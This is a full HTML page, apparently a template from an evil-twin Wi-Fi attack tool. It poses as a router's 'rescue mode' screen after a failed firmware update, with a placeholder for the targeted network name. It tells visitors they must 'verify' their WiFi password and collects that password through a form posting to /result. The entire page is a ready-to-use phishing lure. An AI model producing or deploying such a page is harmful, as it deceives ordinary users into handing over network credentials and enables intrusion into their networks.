<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firmware Update Failed</title>
    <style>
        article { background: #f2f2f2; padding: 1.3em; }
        body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }
        div { padding: 0.5em; }
        h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size: 7vw; }
        input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 10px; border: 1px solid #555555; }
        label { color: #333; display: block; font-style: italic; font-weight: bold; }
        nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }
        nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; }
        textarea { width: 100%; }
    </style>
</head>
<body>
    <nav>
        <b>{Selected_SSID_Name}</b> ACCESS POINT RESCUE MODE
    </nav>

    <div>
        <h1>⚠ Firmware Update Failed</h1>
    </div>

    <div>
        <article>
            Your router encountered a problem while automatically installing the latest Anirudha update.
            <br><br>
            To revert the old firmware and manually update later, please verify your password.
        </article>
    </div>

    <div>
        <form action="/result" method="post">
            <label>WiFi password:</label>
            <input type="password" name="password">
            <input type="submit" value="Submit">
        </form>
    </div>

    <div>
        <br>
        <b>© All rights reserved.</b>
    </div>
</body>
</html>
